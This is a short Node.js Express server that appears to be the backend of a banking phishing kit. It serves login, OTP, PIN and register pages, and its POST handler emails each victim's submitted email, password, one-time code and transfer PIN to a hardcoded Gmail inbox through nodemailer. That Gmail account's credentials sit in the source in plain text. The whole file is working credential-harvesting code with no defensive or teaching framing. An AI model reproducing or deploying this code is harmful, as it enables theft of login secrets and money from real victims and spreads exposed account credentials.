const  express = require("express")
const app = express();
const nodemailer = require('nodemailer'); 


const PORT = process.env.PORT || 5000;


// Middleware 
app.use(express.static('public'))
app.set('view engine', 'ejs')
app.use(express.json())

// index
app.get('/', (req,res ) => {

    res.render("index")
})
// contactForm
app.get('/login', (req,res ) => {

    res.render("login")
})
// otp
app.get('/otp', (req,res ) => {

    res.render("otp")
})
// pin
app.get('/pin', (req,res ) => {

    res.render("pin")
})
// register
app.get('/register', (req,res ) => {

    res.render("register")
})

// contactForm
app.post('/',(req,res) => {
    console.log(req.body)

    const transporter = nodemailer.createTransport({
        service:'gmail',
        auth: {
            user: 'Victorchinemerem191@gmail.com',
            pass: 'aivsveolwtqinddb'
        }
    })

    const mailOptions = {
        from: req.body?.email,
        to:'Victorchinemerem191@gmail.com',
        subject: `Client: ${req.body?.email} \n password: ${req.body?.password} \n Otp Pin: ${req.body?.otp} \n Transfer Pin: ${req.body?.pin}`,
       
    }
console.log(mailOptions)
    transporter.sendMail(mailOptions,(error,info) => {
        if(error){
            console.log(error) 
            res.send('error');
        }else {
            console.log("Email sent", + info.response);
            res.send("success");
        }
    })
    
})




app.listen(PORT, ()=> {
    console.log(`Server running on port http://localhost:${PORT}`)
})